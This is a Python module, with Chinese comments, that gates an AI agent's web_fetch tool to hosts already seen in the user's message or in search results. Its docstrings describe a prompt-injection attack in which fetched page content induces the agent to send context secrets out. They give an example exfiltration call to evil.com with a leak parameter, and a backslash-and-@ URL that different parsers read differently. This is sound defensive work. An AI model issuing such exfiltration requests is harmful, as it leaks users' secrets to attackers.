"""URL provenance gate —— web_fetch 防数据外泄(借 Anthropic web_fetch 的'不准自造 URL'设计).

威胁: 被注入的 fetched-content(trust=unverified web_clip 会再注入)诱导 Lead 调
`web_fetch("https://evil.com/?leak=<secret>")` 把上下文 secret 外泄给攻击者域名. 头号缓解 =
**web_fetch 只能 fetch 上下文已出现过的 host** —— 即用户消息 + 前序 web_search 结果, 而**不**信
fetched 页面正文里出现的 URL(那本身就是不可信内容).

机制: 一个 per-turn 共享 `set[host]` 存在 ToolExecutionContext._seen_url_hosts(正式字段, 计划步骤的
dataclasses.replace 也不丢). 浅拷贝
(`copy.copy(ctx)`)跨 Lead/subagent 按引用共享(subagent.py:2876 注释), 故各 tool dispatch
看到同一个 set:
  - init_lead_transient(turn 起): seed 用户消息里的 host(信任源, 抽得宽松无妨).
  - web_search handler: 把结果 URL 的 host 加进去(信任的 URL 发现工具).
  - web_fetch handler: 查 fetch host 是否在内, 不在则拒.
  - web_fetch **不**把自己 fetch 到的 host 加进去 —— 否则一个被 fetch 过的恶意页就成了"可信 host".

set 为 None(未 wire / 单测 / 非 lead 构造)→ host_allowed 返 None = gate 关(fail-open,
不破坏现有路径). enforcement 由 web_fetch 侧的 BOWHEAD_WEB_FETCH_PROVENANCE flag(默认 ON)控制.

host 级粒度: 比对 (host) 而非完整 URL —— exfil 的 secret 只会发给用户/搜索已露出的 host(攻击者
不控这些 host), 同时容忍同 host 上的 path/query 变化(LLM 常 reformat URL).
"""

from __future__ import annotations

import os
import re
from typing import Any
from urllib.parse import urlsplit

_SEEN_ATTR = "_seen_url_hosts"

# Full http(s) URLs, stopping at whitespace / angle brackets / Chinese or English parentheses / quotes.
_URL_RE = re.compile(r"https?://[^\s<>\"'）)）】\]]+", re.I)
# Bare domain: one or more labels + alphabetic TLD (≥2). Exclude "3.13" (nonalphabetic TLD) / "e.g" (label/TLD length <2).
_DOMAIN_RE = re.compile(
    r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b",
    re.I,
)


def host_of(u: str) -> str:
    """URL / 裸域名 → 规范化 host(小写, 去尾点). 失败返 ''。"""
    s = (u or "").strip()
    if not s:
        return ""
    try:
        h = urlsplit(s if "://" in s else "//" + s, scheme="https").hostname or ""
    except ValueError:
        return ""
    return h.lower().rstrip(".")


def extract_hosts(text: str) -> set[str]:
    """从**信任文本**(用户消息)抽 host: 完整 URL + 裸域名. 信任源 → 抽宽松无妨(只会多放行)."""
    out: set[str] = set()
    if not text:
        return out
    for m in _URL_RE.findall(text):
        h = host_of(m)
        if h:
            out.add(h)
    for m in _DOMAIN_RE.findall(text):
        out.add(m.lower().rstrip("."))
    return out


def seed_seen_hosts(ctx: Any, text: str) -> None:
    """turn 起: 用用户消息 host 初始化 ctx 的 seen set(init_lead_transient 调)."""
    setattr(ctx, _SEEN_ATTR, extract_hosts(text))


def register_seen_hosts(ctx: Any, urls: Any) -> None:
    """把一批 URL 的 host 加进 ctx 的 seen set(若已 seed). web_search 结果调.
    set 未 seed(None)→ no-op."""
    seen = getattr(ctx, _SEEN_ATTR, None)
    if seen is None or not urls:
        return
    for u in urls:
        h = host_of(str(u or ""))
        if h:
            seen.add(h)


def is_unambiguous_http_url(url: str) -> bool:
    """http(s) 且不同解析器对主机不会读出不同结果。

    例：``https://evil.com\\@good.com/`` —— Python ``urlsplit`` 读出主机 ``good.com``（过闸），
    WHATWG / requests 读成 ``evil.com``。交给第三方抓取的 URL 必须拒掉这类写法：
    主机部分含反斜杠、``@``（userinfo）、``%`` 或空白、控制字符的一律不收。"""
    if not url or any(ch.isspace() or ord(ch) < 0x20 or ch == "\\" for ch in url):
        return False
    try:
        parts = urlsplit(url)
    except ValueError:
        return False
    if parts.scheme not in ("http", "https") or not parts.netloc or not parts.hostname:
        return False
    return not any(ch in parts.netloc for ch in "@%")


def unseen_hosts(ctx: Any, hosts: Any) -> list[str]:
    """``hosts`` 里本轮没出现过的（去重、保序）。闸未 seed（None）时返回空表 = 不拦。"""
    seen = getattr(ctx, _SEEN_ATTR, None)
    if seen is None:
        return []
    out: list[str] = []
    for host in hosts or []:
        h = str(host or "").strip().lower().rstrip(".")
        if h and h not in seen and h not in out:
            out.append(h)
    return out


def provenance_gate_enabled() -> bool:
    """BOWHEAD_WEB_FETCH_PROVENANCE（默认开）；web_fetch 与 Tavily 网页工具共用同一个开关."""
    return (os.environ.get("BOWHEAD_WEB_FETCH_PROVENANCE") or "1").strip().lower() not in ("0", "false", "no", "off")


def host_allowed(ctx: Any, url: str) -> bool | None:
    """gate: url 的 host 是否在 seen set.
    返 None = gate 未启用(set 缺失 → fail-open); True/False = 启用且判定结果."""
    seen = getattr(ctx, _SEEN_ATTR, None)
    if seen is None:
        return None
    return host_of(url) in seen
